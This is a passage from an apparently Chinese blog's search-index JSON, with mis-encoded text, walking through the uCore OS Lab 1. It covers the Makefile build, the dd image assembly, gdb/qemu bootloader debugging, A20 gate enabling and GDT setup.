1ç†è§£é€šè¿‡makeç”Ÿæˆæ‰§è¡Œæ–‡ä»¶çš„è¿‡ç¨‹ è¿™ä¸ªç»ƒä¹ éœ€è¦å¯¹Makefileæœ‰ä¸€å®šçš„äº†è§£ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬ä½¿ç”¨make V=çœ‹ä¸€ä¸‹makeæ‰§è¡Œäº†ä»€ä¹ˆå‘½ä»¤ + cc kern/init/init.c gcc -Ikern/init/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/init/init.c -o obj/kern/init/init.o + cc kern/libs/stdio.c gcc -Ikern/libs/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/libs/stdio.c -o obj/kern/libs/stdio.o + cc kern/libs/readline.c gcc -Ikern/libs/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/libs/readline.c -o obj/kern/libs/readline.o + cc kern/debug/panic.c gcc -Ikern/debug/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/debug/panic.c -o obj/kern/debug/panic.o + cc kern/debug/kdebug.c gcc -Ikern/debug/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/debug/kdebug.c -o obj/kern/debug/kdebug.o + cc kern/debug/kmonitor.c gcc -Ikern/debug/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/debug/kmonitor.c -o obj/kern/debug/kmonitor.o + cc kern/driver/clock.c gcc -Ikern/driver/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/driver/clock.c -o obj/kern/driver/clock.o + cc kern/driver/console.c gcc -Ikern/driver/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/driver/console.c -o obj/kern/driver/console.o + cc kern/driver/picirq.c gcc -Ikern/driver/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/driver/picirq.c -o obj/kern/driver/picirq.o + cc kern/driver/intr.c gcc -Ikern/driver/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/driver/intr.c -o obj/kern/driver/intr.o + cc kern/trap/trap.c gcc -Ikern/trap/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/trap/trap.c -o obj/kern/trap/trap.o + cc kern/trap/vectors.S gcc -Ikern/trap/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/trap/vectors.S -o obj/kern/trap/vectors.o + cc kern/trap/trapentry.S gcc -Ikern/trap/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/trap/trapentry.S -o obj/kern/trap/trapentry.o + cc kern/mm/pmm.c gcc -Ikern/mm/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/mm/pmm.c -o obj/kern/mm/pmm.o + cc libs/string.c gcc -Ilibs/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -c libs/string.c -o obj/libs/string.o + cc libs/printfmt.c gcc -Ilibs/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -c libs/printfmt.c -o obj/libs/printfmt.o + ld bin/kernel ld -m elf_i386 -nostdlib -T tools/kernel.ld -o bin/kernel obj/kern/init/init.o obj/kern/libs/stdio.o obj/kern/libs/readline.o obj/kern/debug/panic.o obj/kern/debug/kdebug.o obj/kern/debug/kmonitor.o obj/kern/driver/clock.o obj/kern/driver/console.o obj/kern/driver/picirq.o obj/kern/driver/intr.o obj/kern/trap/trap.o obj/kern/trap/vectors.o obj/kern/trap/trapentry.o obj/kern","date":"2021-07-10","objectID":"/ucore-lab-1/:1:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ç»ƒä¹ 1"},{"categories":["Pwning"],"content":"ddå‘½ä»¤dd å‘½ä»¤ç”¨äºè¯»å–ã€è½¬æ¢å¹¶è¾“å‡ºæ•°æ®ã€‚dd å¯ä»æ ‡å‡†è¾“å…¥æˆ–æ–‡ä»¶ä¸­è¯»å–æ•°æ®ï¼Œæ ¹æ®æŒ‡å®šçš„æ ¼å¼æ¥è½¬æ¢æ•°æ®ï¼Œå†è¾“å‡ºåˆ°æ–‡ä»¶ã€è®¾å¤‡æˆ–æ ‡å‡†è¾“å‡ºã€‚ ä»…é’ˆå¯¹å‡ºç°çš„å‚æ•°è¿›è¡Œè§£é‡Šï¼š if=æ–‡ä»¶åï¼šè¾“å…¥æ–‡ä»¶åï¼Œé»˜è®¤ä¸ºæ ‡å‡†è¾“å…¥ã€‚å³æŒ‡å®šæºæ–‡ä»¶ã€‚ of=æ–‡ä»¶åï¼šè¾“å‡ºæ–‡ä»¶åï¼Œé»˜è®¤ä¸ºæ ‡å‡†è¾“å‡ºã€‚å³æŒ‡å®šç›®çš„æ–‡ä»¶ã€‚ seek=blocksï¼šä»è¾“å‡ºæ–‡ä»¶å¼€å¤´è·³è¿‡blocksä¸ªå—åå†å¼€å§‹å¤åˆ¶ã€‚ count=blocksï¼šä»…æ‹·è´blocksä¸ªå—ï¼Œå—å¤§å°ç­‰äºibsæŒ‡å®šçš„å­—èŠ‚æ•°ã€‚ è¿™æ ·å¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬æœ€åç”Ÿæˆçš„æ–‡ä»¶å°±æ˜¯bin/ucore.imgè¿™ä¸ªé•œåƒæ–‡ä»¶ï¼Œè€Œæœ€åçš„ä¸‰ä¸ªddå‘½ä»¤ dd if=/dev/zero of=bin/ucore.img count=10000 // å°†æ–‡ä»¶bin/ucore.imgè¿›è¡Œæ¸…ç©º dd if=bin/bootblock of=bin/ucore.img conv=notrunc // å‘imgçš„å¼€å§‹å†™å…¥512å­—èŠ‚çš„bootloader dd if=bin/kernel of=bin/ucore.img seek=1 conv=notrunc // è·³è¿‡ç¬¬ä¸€ä¸ªå—512å­—èŠ‚ï¼Œå†™å…¥å†…æ ¸ æ¥ç€ï¼Œæˆ‘ä»¬å°±ä»Makefileä¸­çœ‹çœ‹ï¼Œä¸ºäº†å¾—åˆ°bin/ucore.imgï¼Œæˆ‘ä»¬è¦æå‰å‡†å¤‡é‚£äº›æ–‡ä»¶ Makefileå°±æ˜¯è¿™æ ·çš„ï¼Œåœ¨å…¶ä¸­æŒ‡å®šäº†ä»£ç ç¼–è¯‘çš„è§„åˆ™ï¼Œæ›´é‡è¦çš„æ˜¯æŒ‡å®šäº†ç¨‹åºä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œæ‰€ä»¥ä»å¤´çœ‹æ˜¯ä¸è¡Œçš„ï¼Œè¦ä»æœ€åçš„ç»“æœæ¥æ¨å¯¼æ•´ä¸ªæ–‡ä»¶çš„ç»“æ„ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:1","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ddå‘½ä»¤"},{"categories":["Pwning"],"content":"ucore.img # create ucore.img UCOREIMG := $(call totarget,ucore.img) $(UCOREIMG): $(kernel) $(bootblock) $(V)dd if=/dev/zero of=$@ count=10000 $(V)dd if=$(bootblock) of=$@ conv=notrunc $(V)dd if=$(kernel) of=$@ seek=1 conv=notrunc $(call create_target,ucore.img) ä¸ºäº†å¾—åˆ°ucore.imgï¼Œéœ€è¦kernelå’Œbootblockã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:2","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ucoreimg"},{"categories":["Pwning"],"content":"bootblock # create bootblock bootfiles = $(call listf_cc,boot) $(foreach f,$(bootfiles),$(call cc_compile,$(f),$(CC),$(CFLAGS) -Os -nostdinc)) # è¿™é‡Œéå† boot ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ asm.h bootasm.S bootmain.c bootblock = $(call totarget,bootblock) # ç”Ÿæˆç›®æ ‡æ–‡ä»¶ asm.o bootasm.o bootmain.o sign.o $(bootblock): $(call toobj,$(bootfiles)) | $(call totarget,sign) @echo + ld $@ $(V)$(LD) $(LDFLAGS) -N -e start -Ttext 0x7C00 $^ -o $(call toobj,bootblock) @$(OBJDUMP) -S $(call objfile,bootblock) \u003e $(call asmfile,bootblock) @$(OBJDUMP) -t $(call objfile,bootblock) | $(SED) '1,/SYMBOL TABLE/d; s/ .* / /; /^$$/d' \u003e $(call symfile,bootblock) @$(OBJCOPY) -S -O binary $(call objfile,bootblock) $(call outfile,bootblock) @$(call totarget,sign) $(call outfile,bootblock) $(bootblock) # å°†ç›®æ ‡æ–‡ä»¶ é“¾æ¥èµ·æ¥ åŒæ—¶æŒ‡å®šä»£ç æ®µå¼€å§‹åœ°å€ ä¸º 0x7c00 $(call create_target,bootblock) ç”Ÿæˆbootblockï¼Œéœ€è¦bootasm.oã€bootmain.oã€sign ç”Ÿæˆbootasm.oéœ€è¦bootasm.Sï¼Œå®é™…æ‰§è¡Œå‘½ä»¤ä¸º gcc -Iboot/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Os -nostdinc -c boot/bootasm.S -o obj/boot/bootasm.o å…¶ä¸­å…³é”®çš„å‚æ•°ä¸º -ggdb ç”Ÿæˆå¯ä¾›gdbä½¿ç”¨çš„è°ƒè¯•ä¿¡æ¯ã€‚è¿™æ ·æ‰èƒ½ç”¨qemu+gdbæ¥è°ƒè¯•bootloader or ucoreã€‚ -m32 ç”Ÿæˆé€‚ç”¨äº32ä½ç¯å¢ƒçš„ä»£ç ã€‚æˆ‘ä»¬ç”¨çš„æ¨¡æ‹Ÿç¡¬ä»¶æ˜¯32bitçš„80386ï¼Œæ‰€ä»¥ucoreä¹Ÿè¦æ˜¯32ä½çš„è½¯ä»¶ã€‚ -gstabs ç”Ÿæˆstabsæ ¼å¼çš„è°ƒè¯•ä¿¡æ¯ã€‚è¿™æ ·è¦ucoreçš„monitorå¯ä»¥æ˜¾ç¤ºå‡ºä¾¿äºå¼€å‘è€…é˜…è¯»çš„å‡½æ•°è°ƒç”¨æ ˆä¿¡æ¯ -nostdinc ä¸ä½¿ç”¨æ ‡å‡†åº“ã€‚æ ‡å‡†åº“æ˜¯ç»™åº”ç”¨ç¨‹åºç”¨çš„ï¼Œæˆ‘ä»¬æ˜¯ç¼–è¯‘ucoreå†…æ ¸ï¼ŒOSå†…æ ¸æ˜¯æä¾›æœåŠ¡çš„ï¼Œæ‰€ä»¥æ‰€æœ‰çš„æœåŠ¡è¦è‡ªç»™è‡ªè¶³ã€‚ -fno-stack-protector ä¸ç”Ÿæˆç”¨äºæ£€æµ‹ç¼“å†²åŒºæº¢å‡ºçš„ä»£ç ã€‚è¿™æ˜¯for åº”ç”¨ç¨‹åºçš„ï¼Œæˆ‘ä»¬æ˜¯ç¼–è¯‘å†…æ ¸ï¼Œucoreå†…æ ¸å¥½åƒè¿˜ç”¨ä¸åˆ°æ­¤åŠŸèƒ½ã€‚ -Os ä¸ºå‡å°ä»£ç å¤§å°è€Œè¿›è¡Œä¼˜åŒ–ã€‚æ ¹æ®ç¡¬ä»¶specï¼Œä¸»å¼•å¯¼æ‰‡åŒºåªæœ‰512å­—èŠ‚ï¼Œæˆ‘ä»¬å†™çš„ç®€å•bootloaderçš„æœ€ç»ˆå¤§å°ä¸èƒ½å¤§äº510å­—èŠ‚ã€‚ -I\u003cdir\u003e æ·»åŠ æœç´¢å¤´æ–‡ä»¶çš„è·¯å¾„ ç”Ÿæˆbootmain.oéœ€è¦bootmain.c å®é™…æ‰§è¡Œå‘½ä»¤ä¸º gcc -Iboot/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Os -nostdinc -c boot/bootmain.c -o obj/boot/bootmain.o -fno-builtin é™¤éç”¨__builtin_å‰ç¼€ï¼Œå¦åˆ™ä¸è¿›è¡Œbuiltinå‡½æ•°çš„ä¼˜åŒ– ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:3","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#bootblock"},{"categories":["Pwning"],"content":"sign # create 'sign' tools $(call add_files_host,tools/sign.c,sign,sign) $(call create_target_host,sign,sign) å®é™…æ‰§è¡Œå‘½ä»¤ä¸º gcc -Itools/ -g -Wall -O2 -c tools/sign.c -o obj/sign/tools/sign.o gcc -g -Wall -O2 obj/sign/tools/sign.o -o bin/sign é¦–å…ˆç”Ÿæˆbootblock.o ld -m elf_i386 -nostdlib -N -e start -Ttext 0x7C00 obj/boot/bootasm.o obj/boot/bootmain.o -o obj/bootblock.o å…¶ä¸­å…³é”®çš„å‚æ•°ä¸º -m \u003cemulation\u003e æ¨¡æ‹Ÿä¸ºi386ä¸Šçš„è¿æ¥å™¨ -nostdlib ä¸ä½¿ç”¨æ ‡å‡†åº“ -N è®¾ç½®ä»£ç æ®µå’Œæ•°æ®æ®µå‡å¯è¯»å†™ -e \u003centry\u003e æŒ‡å®šå…¥å£ -Ttext åˆ¶å®šä»£ç æ®µå¼€å§‹ä½ç½® æ‹·è´äºŒè¿›åˆ¶ä»£ç bootblock.oåˆ°bootblock.out objcopy -S -O binary obj/bootblock.o obj/bootblock.out å…¶ä¸­å…³é”®çš„å‚æ•°ä¸º -S ç§»é™¤æ‰€æœ‰ç¬¦å·å’Œé‡å®šä½ä¿¡æ¯ -O \u003cbfdname\u003e æŒ‡å®šè¾“å‡ºæ ¼å¼ ä½¿ç”¨signå·¥å…·å¤„ç†bootblock.outï¼Œç”Ÿæˆbootblock bin/sign obj/bootblock.out bin/bootblock ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:4","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#sign"},{"categories":["Pwning"],"content":"kernel # create kernel target kernel = $(call totarget,kernel) $(kernel): tools/kernel.ld $(kernel): $(KOBJS) @echo + ld $@ $(V)$(LD) $(LDFLAGS) -T tools/kernel.ld -o $@ $(KOBJS) @$(OBJDUMP) -S $@ \u003e $(call asmfile,kernel) @$(OBJDUMP) -t $@ | $(SED) '1,/SYMBOL TABLE/d; s/ .* / /; /^$$/d' \u003e $(call symfile,kernel) $(call create_target,kernel) kernel.ldæ˜¯å·²å­˜åœ¨çš„é“¾æ¥å™¨ï¼Œè¿™ä¸€æ­¥å°†kernç›®å½•ä¸‹ç”Ÿæˆçš„æ‰€æœ‰.oæ–‡ä»¶ï¼Œé€šè¿‡kernel.ldé“¾æ¥ä¸ºkernelã€‚ -T\u003cé“¾æ¥å™¨è·¯å¾„\u003eï¼Œä½¿ç”¨æŒ‡å®šçš„é“¾æ¥å™¨ å…¶å‰ç½®å‘½ä»¤å°±æ˜¯å°†kernä¸‹é¢çš„æ‰€æœ‰æ–‡ä»¶ç¼–è¯‘ï¼Œç”Ÿæˆç›®æ ‡æ–‡ä»¶ # kernel KINCLUDE += kern/debug/ \\ kern/driver/ \\ kern/trap/ \\ kern/mm/ KSRCDIR += kern/init \\ kern/libs \\ kern/debug \\ kern/driver \\ kern/trap \\ kern/mm KCFLAGS += $(addprefix -I,$(KINCLUDE)) $(call add_files_cc,$(call listf_cc,$(KSRCDIR)),kernel,$(KCFLAGS)) KOBJS = $(call read_packet,kernel libs) ä¸€ä¸ªè¢«ç³»ç»Ÿè®¤ä¸ºæ˜¯ç¬¦åˆè§„èŒƒçš„ç¡¬ç›˜ä¸»å¼•å¯¼æ‰‡åŒºçš„ç‰¹å¾æ˜¯ä»€ä¹ˆï¼Ÿ code: sign.c ... buf[510] = 0x55; buf[511] = 0xAA; ... ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:5","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#kernel"},{"categories":["Pwning"],"content":"ç»ƒä¹ 2ä½¿ç”¨qemuæ‰§è¡Œå¹¶è°ƒè¯•lab1ä¸­çš„è½¯ä»¶ åœ¨å¼€å§‹debugä¹‹å‰ï¼Œæˆ‘ä»¬å‚è€ƒå…¶å®éªŒæŠ¥å‘Šä¸­çš„æç¤ºå°†/tools/gdbinitçš„å†…å®¹ä¿®æ”¹å¦‚ä¸‹ï¼š file bin/kernel set architecture i8086 target remote :1234 b* 0x7c00 define hook-stop x/i $eip end continue ä¹‹åä½¿ç”¨make debugå°±å¯ä»¥è¿›è¡Œè°ƒè¯•ã€‚ è¿™é‡Œpwndbgæ’ä»¶æ— æ³•è¿›è¡Œè°ƒè¯•ï¼Œåªèƒ½ä½¿ç”¨pedaäº† ä¹Ÿå¯ä»¥ç›´æ¥å¯¹ç­”æ¡ˆè¿›è¡Œè°ƒè¯•ï¼Œä½¿ç”¨make lab1-monã€‚ ä¸‹é¢æˆ‘ä»¬å°†åæ±‡ç¼–å¾—åˆ°çš„ä»£ç ä¸bootasm.Så’Œ bootblock.asmè¿›è¡Œæ¯”è¾ƒï¼š gdb-peda$ x/10i 0x7c02: xor eax,eax 0x7c04: mov ds,eax 0x7c06: mov es,eax 0x7c08: mov ss,eax 0x7c0a: in al,0x64 0x7c0c: test al,0x2 0x7c0e: jne 0x7c0a 0x7c10: mov al,0xd1 0x7c12: out 0x64,al 0x7c14: in al,0x64 è€Œåœ¨bootblock.asmä¸­ 00007c00 \u003cstart\u003e: # start address should be 0:7c00, in real mode, the beginning address of the running bootloader .globl start start: .code16 # Assemble for 16-bit mode cli # Disable interrupts 7c00: fa cli cld # String operations increment 7c01: fc cld # Set up the important data segment registers (DS, ES, SS). xorw %ax, %ax # Segment number zero 7c02: 31 c0 xor %eax,%eax movw %ax, %ds # -\u003e Data Segment 7c04: 8e d8 mov %eax,%ds movw %ax, %es # -\u003e Extra Segment 7c06: 8e c0 mov %eax,%es movw %ax, %ss # -\u003e Stack Segment 7c08: 8e d0 mov %eax,%ss å½“ä½ åˆ é™¤gdbinitä¸­çš„continueåï¼Œå°±å¯ä»¥è°ƒè¯•ä»BIOSå¼€å§‹çš„æŒ‡ä»¤ã€‚éå¸¸æœ‰è¶£çš„ä¸€ç‚¹æ˜¯ï¼Œè®°å¾—å—ï¼Œæ‰§è¡ŒBIOSæ—¶ï¼Œcpuè¿˜åœ¨å®æ¨¡å¼ï¼Œè€Œgdbé»˜è®¤åªè¾“å‡º$ip æ‰€æŒ‡å‘åœ°å€çš„æŒ‡é’ˆï¼Œè€Œä¸æ˜¯cs:ipã€‚æ­£ç¡®çš„æŒ‡ä»¤åº”è¯¥æ˜¯è¿™æ ·ï¼š gdb-peda$ x/5i (($cs\u003c\u003c4)+$eip) 0xffff0: jmp 0x3630:0xf000e05b 0xffff7: das 0xffff8: xor dh,BYTE PTR [ebx] 0xffffa: das 0xffffb: cmp DWORD PTR [ecx],edi gdb-peda$ x/5i (($cs\u003c\u003c4)+$eip) 0xfe05b: cmp WORD PTR cs:[esi],0xffc8 0xfe060: bound eax,QWORD PTR [eax] 0xfe062: jne 0xd241d0b2 0xfe068: mov ss,edx 0xfe06a: mov sp,0x7000 ï¼ˆæ„Ÿè°¢@2st\u0026@kipreyï¼‰ ","date":"2021-07-10","objectID":"/ucore-lab-1/:2:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ç»ƒä¹ 2"},{"categories":["Pwning"],"content":"ç»ƒä¹ 3åˆ†æbootloaderè¿›å…¥ä¿æŠ¤æ¨¡å¼çš„è¿‡ç¨‹ start: .code16 # Assemble for 16-bit mode cli # Disable interrupts cld # String operations increment # Set up the important data segment registers (DS, ES, SS). xorw %ax, %ax # Segment number zero movw %ax, %ds # -\u003e Data Segment movw %ax, %es # -\u003e Extra Segment movw %ax, %ss # -\u003e Stack Segment é¦–å…ˆï¼Œcliç¦ç”¨ä¸­æ–­ï¼Œå®ƒçš„å…¨ç§°ä¸ºClear Interuptã€‚cld(Clear Direction)è®¾ç½®äº†å­—èŠ‚çš„ä¼ è¾“ä»ä½ä½å¼€å§‹ã€‚æ¸…ç©ºé‡è¦çš„æ®µå¯„å­˜å™¨ã€‚ cldæŒ‡ä»¤ä½¿å˜å€å¯„å­˜å™¨SIæˆ–DIçš„åœ°å€æŒ‡é’ˆè‡ªåŠ¨å¢åŠ ï¼Œä»å‰å‘åå¤„ç†ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:3:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ç»ƒä¹ 3"},{"categories":["Pwning"],"content":"æœ‰å…³A20ï¼Ÿ ä¸ºä»€ä¹ˆè¦å¼€å¯A20ï¼Ÿ Intelæ—©æœŸçš„8086 CPUæä¾›äº†20æ ¹åœ°å€çº¿ï¼Œä½†å¯„å­˜å™¨åªæœ‰16ä½ï¼Œæ‰€ä»¥ä½¿ç”¨æ®µå¯„å­˜å™¨å€¼ Â« 4 + æ®µå†…åç§»å€¼çš„æ–¹æ³•æ¥è®¿é—®åˆ°æ‰€æœ‰å†…å­˜ï¼Œä½†æŒ‰è¿™ç§æ–¹å¼æ¥è®¡ç®—å‡ºçš„åœ°å€çš„æœ€å¤§å€¼ä¸º1088KBï¼Œè¶…è¿‡20æ ¹åœ°å€çº¿æ‰€èƒ½è¡¨ç¤ºçš„èŒƒå›´ï¼Œä¼šå‘ç”Ÿâ€œå›å·â€(memory wraparound)ï¼ˆå’Œæ•´æ•°æº¢å‡ºæœ‰ç‚¹ç±»ä¼¼ï¼‰ã€‚ä½†ä¸‹ä¸€ä»£çš„åŸºäºIntel 80286 CPUçš„è®¡ç®—æœºç³»ç»Ÿæä¾›äº†24æ ¹åœ°å€çº¿ï¼Œå½“CPUè®¡ç®—å‡ºçš„åœ°å€è¶…è¿‡1MBæ—¶ä¾¿ä¸ä¼šå‘ç”Ÿå›å·ï¼Œè€Œè¿™å°±é€ æˆäº†å‘ä¸‹ä¸å…¼å®¹ã€‚ä¸ºäº†ä¿æŒå®Œå…¨çš„å‘ä¸‹å…¼å®¹æ€§ï¼ŒIBMåœ¨è®¡ç®—æœºç³»ç»Ÿä¸ŠåŠ ä¸ªç¡¬ä»¶é€»è¾‘æ¥æ¨¡ä»¿æ—©æœŸçš„å›ç»•ç‰¹å¾ï¼Œè€Œè¿™å°±æ˜¯A20 Gateã€‚ å¦‚ä½•å¼€å¯A20ï¼Ÿ A20 Gateçš„æ–¹æ³•æ˜¯æŠŠA20åœ°å€çº¿æ§åˆ¶å’Œé”®ç›˜æ§åˆ¶å™¨çš„ä¸€ä¸ªè¾“å‡ºè¿›è¡ŒANDæ“ä½œï¼Œè¿™æ ·æ¥æ§åˆ¶A20åœ°å€çº¿çš„æ‰“å¼€ï¼ˆä½¿èƒ½ï¼‰å’Œå…³é—­ï¼ˆå±è”½\\ç¦æ­¢ï¼‰ã€‚ä¸€å¼€å§‹æ—¶A20åœ°å€çº¿æ§åˆ¶æ˜¯è¢«å±è”½çš„ï¼ˆæ€»ä¸º0ï¼‰ï¼Œç›´åˆ°ç³»ç»Ÿè½¯ä»¶é€šè¿‡ä¸€å®šçš„IOæ“ä½œå»æ‰“å¼€å®ƒã€‚å½“A20 åœ°å€çº¿æ§åˆ¶ç¦æ­¢æ—¶ï¼Œåˆ™ç¨‹åºå°±åƒåœ¨8086ä¸­è¿è¡Œï¼Œ1MBä»¥ä¸Šçš„åœ°å€ä¸å¯è®¿é—®ï¼›ä¿æŠ¤æ¨¡å¼ä¸‹A20åœ°å€çº¿æ§åˆ¶å¿…é¡»æ‰“å¼€ã€‚A20æ§åˆ¶æ‰“å¼€åï¼Œå†…å­˜å¯»å€å°†ä¸ä¼šå‘ç”Ÿå›å·ã€‚ é€šå¸¸çš„æ–¹æ³•æ˜¯é€šè¿‡è®¾ç½®é”®ç›˜æ§åˆ¶å™¨çš„ç«¯å£å€¼ï¼Œä¸è¿‡æœ‰äº›ç³»ç»Ÿè§‰å¾—é”®ç›˜æ§åˆ¶å™¨å¾ˆæ…¢ï¼Œä¸ºæ­¤å¼•å…¥äº†ä¸€ä¸ªFast Gate A20ï¼Œå®ƒç”¨IOç«¯å£çš„0x92æ¥å¤„ç†A20ä¿¡å·çº¿ã€‚è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯é€šè¿‡è¯»å–0xeeç«¯å£æ¥å¼€å¯A20åœ°å€çº¿ï¼Œå†™ç«¯å£åˆ™ä¼šç¦æ­¢åœ°å€çº¿ã€‚ ä»ç†è®ºä¸Šè®²ï¼Œæ‰“å¼€A20 Gateçš„æ–¹æ³•æ˜¯é€šè¿‡è®¾ç½®8042èŠ¯ç‰‡è¾“å‡ºç«¯å£ï¼ˆ64hï¼‰çš„2nd-bitï¼Œä½†äº‹å®ä¸Šï¼Œå½“ä½ å‘8042èŠ¯ç‰‡è¾“å‡ºç«¯å£è¿›è¡Œå†™æ“ä½œçš„æ—¶å€™ï¼Œåœ¨é”®ç›˜ç¼“å†²åŒºä¸­æˆ–è®¸è¿˜æœ‰åˆ«çš„æ•°æ®å°šæœªå¤„ç†ï¼Œå› æ­¤ä½ å¿…é¡»é¦–å…ˆå¤„ç†è¿™äº›æ•°æ®ã€‚ æ‰€ä»¥ï¼Œæ¿€æ´»A20åœ°å€çº¿çš„æµç¨‹ä¸ºï¼š 1.ç¦æ­¢ä¸­æ–­ï¼›2.ç­‰å¾…ï¼Œç›´åˆ°8042 Input bufferä¸ºç©ºä¸ºæ­¢ï¼› 3.å‘é€Write 8042 Output Portå‘½ä»¤åˆ°8042 Input bufferï¼›4.ç­‰å¾…ï¼Œç›´åˆ°8042 Input bufferä¸ºç©ºä¸ºæ­¢ï¼›5.å‘P2å†™å…¥æ•°æ®ï¼Œå°†OR2ç½®1 ï¼ˆå…³äºæ¿€æ´»æˆ‘æ²¡æœ‰æ‰¾åˆ°å¾ˆè¯¦ç»†çš„èµ„æ–™ï¼Œåªæœ‰A20æ¿€æ´»è¯¦è§£ï¼‰ å¯åŠ¨A20çš„æ±‡ç¼–ä»£ç å¦‚ä¸‹ # Enable A20: # For backwards compatibility with the earliest PCs, physical # address line 20 is tied low, so that addresses higher than # 1MB wrap around to zero by default. This code undoes this. seta20.1: # ç­‰å¾…8042é”®ç›˜æ§åˆ¶å™¨ä¸å¿™ inb $0x64, %al # ä»0x64é”®ç›˜ç¼“å†²åŒºæ¥æ”¶æ¶ˆæ¯ testb $0x2, %al # å¦‚æœæ¥å—åˆ°2åˆ™è¡¨æ˜é”®ç›˜ç¼“å†²åŒºä¸ºç©º jnz seta20.1 # movb $0xd1, %al # å‘é€å†™8042è¾“å‡ºç«¯å£çš„æŒ‡ä»¤ outb %al, $0x64 # 0xd1è¡¨ç¤ºå†™è¾“å‡ºç«¯å£P2 seta20.1: # ç­‰å¾…8042é”®ç›˜æ§åˆ¶å™¨ä¸å¿™ inb $0x64, %al # testb $0x2, %al # jnz seta20.1 # movb $0xdf, %al # 0xdf --\u003e P2 outb %al, $0x60 # 1101 1111 ï¼ŒP2çš„P21ç½®ä¸º1 ","date":"2021-07-10","objectID":"/ucore-lab-1/:3:1","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#æœ‰å…³a20"},{"categories":["Pwning"],"content":"å¦‚ä½•åˆå§‹åŒ–GDTè¡¨ï¼Ÿ # Bootstrap GDT .p2align 2 # force 4 byte alignment gdt: SEG_NULLASM # null seg SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff) # code seg for bootloader and kernel SEG_ASM(STA_W, 0x0, 0xffffffff) # data seg for bootloader and kernel gdtdesc: .word 0x17 # sizeof(gdt) - 1 .long gdt # address gdt è®¾ç½®è¡¨ä¸­ç¬¬ä¸€é¡¹ä¸ºNULL è¡¨ä¸­ç¬¬äºŒé¡¹ä¸ºä»£ç æ®µæè¿°ç¬¦ï¼Œå¯è¯»å¯æ‰§è¡Œ è¡¨ä¸­ç¬¬äºŒé¡¹ä¸ºæ•°æ®æ®µæè¿°ç¬¦ï¼Œå¯å†™ 